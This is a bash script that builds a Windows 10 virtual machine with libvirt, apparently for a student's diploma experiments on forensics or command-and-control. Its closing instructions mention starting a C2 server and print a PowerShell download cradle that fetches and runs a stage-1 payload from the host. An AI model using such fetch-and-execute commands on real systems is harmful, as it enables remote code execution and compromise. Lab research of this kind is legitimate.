#!/bin/bash
# Create Windows 10 forensic VM for diploma experiments

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ISO_DIR="$SCRIPT_DIR/isos"
IMAGE_DIR="$SCRIPT_DIR/vm_images"
VM_NAME="win10-forensic"
RAM_MB="4096"
VCPUS="4"
DISK_GB="20"

echo "=========================================="
echo "Windows 10 Forensic VM Creation"
echo "=========================================="

# Check libvirt
if ! command -v virsh &>/dev/null; then
    echo "ERROR: virsh not found. Install libvirt first:"
    echo "  sudo dnf install -y libvirt virt-install qemu-kvm"
    exit 1
fi

# Find ISO
ISO_PATH=""
if [ -f "$ISO_DIR/Win10.iso" ]; then
    ISO_PATH="$ISO_DIR/Win10.iso"
elif [ -f "$ISO_DIR/Win10_22H2_English_x64.iso" ]; then
    ISO_PATH="$ISO_DIR/Win10_22H2_English_x64.iso"
else
    echo "ISO files in $ISO_DIR:"
    ls -la "$ISO_DIR/" 2>/dev/null || echo "  (directory empty or missing)"
    read -rp "Enter full path to Windows 10 ISO: " ISO_PATH
fi

if [ ! -f "$ISO_PATH" ]; then
    echo "ERROR: ISO not found: $ISO_PATH"
    exit 1
fi

echo "Using ISO: $ISO_PATH"

# Create image dir
mkdir -p "$IMAGE_DIR"
DISK_PATH="$IMAGE_DIR/${VM_NAME}.qcow2"

# Create disk if not exists
if [ ! -f "$DISK_PATH" ]; then
    echo "Creating ${DISK_GB}GB QCOW2 disk at $DISK_PATH..."
    qemu-img create -f qcow2 "$DISK_PATH" "${DISK_GB}G"
else
    echo "Disk already exists: $DISK_PATH"
    read -rp "Reuse existing disk? (y/n) " REUSE
    if [[ ! $REUSE =~ ^[Yy]$ ]]; then
        echo "Exiting. Delete $DISK_PATH manually to recreate."
        exit 1
    fi
fi

# Check if VM already exists
if virsh list --all --name | grep -qx "$VM_NAME"; then
    echo "VM '$VM_NAME' already exists."
    read -rp "Destroy and redefine? (y/n) " REDO
    if [[ $REDO =~ ^[Yy]$ ]]; then
        virsh destroy "$VM_NAME" 2>/dev/null || true
        virsh undefine "$VM_NAME" --remove-all-storage 2>/dev/null || true
    else
        echo "Starting existing VM..."
        virsh start "$VM_NAME" 2>/dev/null || true
        echo "VM '$VM_NAME' is ready."
        echo "Connect with: virt-viewer $VM_NAME"
        exit 0
    fi
fi

echo "Creating VM '$VM_NAME'..."

virt-install \
    --name "$VM_NAME" \
    --memory "$RAM_MB" \
    --vcpus "$VCPUS" \
    --cpu host \
    --disk path="$DISK_PATH",format=qcow2,bus=virtio,cache=none \
    --cdrom "$ISO_PATH" \
    --os-variant win10 \
    --network network=default,model=virtio \
    --graphics spice,listen=0.0.0.0 \
    --noautoconsole \
    --boot cdrom,hd \
    --tpm emulator \
    --features kvm_hidden=on

echo ""
echo "=========================================="
echo "VM '$VM_NAME' created successfully!"
echo "=========================================="
echo ""
echo "Next steps:"
echo "  1. Connect to the VM to install Windows:"
echo "     virt-viewer $VM_NAME"
echo "  2. Or open virt-manager for GUI:"
echo "     virt-manager"
echo "  3. Install Windows, enable PowerShell remoting if needed"
echo "  4. Note the VM IP (usually 192.168.122.x)"
echo "  5. Start C2 server on host: ./manage.sh start"
echo "  6. From VM PowerShell:"
echo "     IEX ((New-Object Net.WebClient).DownloadString('http://192.168.122.1:8080/get/stage1_windows.ps1'))"
echo ""
echo "Disk:     $DISK_PATH"
echo "Memory:   ${RAM_MB}MB"
echo "vCPUs:    $VCPUS"
echo "Network:  default NAT (host = 192.168.122.1)"
